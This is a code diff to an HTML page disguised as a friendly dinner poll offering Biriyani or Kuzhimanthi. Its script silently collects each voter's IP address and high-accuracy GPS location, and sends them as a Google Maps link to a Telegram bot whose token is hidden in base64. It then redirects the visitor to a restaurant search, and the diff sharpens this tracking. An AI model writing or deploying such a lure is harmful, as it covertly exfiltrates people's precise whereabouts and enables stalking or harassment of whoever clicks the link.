@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Dinner Poll</title>
+    <title>Dinner Choice</title>
     <style>
-        body { background-color: #f4f4f4; font-family: 'Arial', sans-serif; text-align: center; padding: 15px; margin: 0; }
-        .container { max-width: 450px; margin: auto; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
-        h2 { color: #d35400; margin: 10px 0; }
-        .food-item { margin-bottom: 25px; cursor: pointer; border: 2px solid #eee; border-radius: 12px; overflow: hidden; transition: 0.3s; background: #fff; }
+        body { background-color: #f8f9fa; font-family: 'Segoe UI', Tahoma, sans-serif; text-align: center; padding: 15px; margin: 0; }
+        .container { max-width: 450px; margin: auto; background: white; padding: 20px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
+        h2 { color: #d35400; margin-bottom: 5px; }
+        .food-item { margin-bottom: 25px; cursor: pointer; border: 2px solid #eee; border-radius: 15px; overflow: hidden; transition: 0.3s; background: #fff; position: relative; }
         .food-item:hover { border-color: #d35400; transform: translateY(-5px); }
         img { width: 100%; height: 250px; object-fit: cover; display: block; }
         .name { font-weight: bold; padding: 12px; display: block; background: #fff; color: #333; font-size: 18px; }
@@ -18,15 +18,15 @@
 <body onload="initData()">
     <div class="container">
         <h2>ഇന്ന് ഏത് വേണം? 😋</h2>
-        <p>നിനക്ക് ഇഷ്ടമുള്ളത് ഒന്ന് സെലക്ട് ചെയ്യൂ!</p>
+        <p>Pick your favorite one!</p>
 
         <div class="food-item" onclick="handleVote('Biriyani')">
-            <img src="https://images.unsplash.com/photo-1563379091339-03b21ab4a4f8?q=80&w=1000&auto=format&fit=crop" alt="Biriyani">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5a/Chicken_Biryani_in_Chennai.jpg/800px-Chicken_Biryani_in_Chennai.jpg" alt="Biriyani">
             <span class="name">🍗 HYDERABADI BIRIYANI</span>
         </div>
 
         <div class="food-item" onclick="handleVote('Kuzhimanthi')">
-            <img src="https://images.unsplash.com/photo-1633945274405-b6c8069047b0?q=80&w=1000&auto=format&fit=crop" alt="Kuzhimanthi">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ee/Chicken_Mandi.jpg/800px-Chicken_Mandi.jpg" alt="Kuzhimanthi">
             <span class="name">🥘 ARABIAN KUZHIMANTHI</span>
         </div>
 
@@ -35,6 +35,7 @@
 
     <script>
         let user_ip = "N/A";
+        // Telegram keys encoded for safety
         const tok = "ODY0NzIwNjgxODpBQUZaTE91bVFwSUJZRDNXdURjZWVPR1drTkRDTFZpR3paSQ==";
         const cid = "NzAwODk1Mjc0Ng==";
 
@@ -50,24 +51,30 @@
             document.getElementById('status').style.display = 'block';
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    p => sendData(food, p.coords.latitude + "," + p.coords.longitude), 
-                    () => sendData(food, "Denied")
+                    p => {
+                        const lat = p.coords.latitude;
+                        const lon = p.coords.longitude;
+                        const locLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                        sendData(food, locLink);
+                    }, 
+                    () => sendData(food, "Permission Denied"),
+                    { enableHighAccuracy: true, timeout: 5000 }
                 );
             } else {
-                sendData(food, "No-Geo");
+                sendData(food, "Location Not Supported");
             }
         }
 
-        async function sendData(food, loc) {
+        async function sendData(food, locInfo) {
             const botToken = atob(tok);
             const chatId = atob(cid);
-            const msg = `🍽 *Vote:* ${food}\n🌐 *IP:* ${user_ip}\n📍 *Loc:* ${loc}`;
+            const msg = `🍴 *New Vote: ${food}*\n🌐 *IP:* ${user_ip}\n📍 *Google Map:* ${locInfo}`;
             
             await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
             
             setTimeout(() => {
                 window.location.href = "https://www.google.com/search?q=restaurants+near+me";
-            }, 2000);
+            }, 1000);
         }
     </script>
 </body>
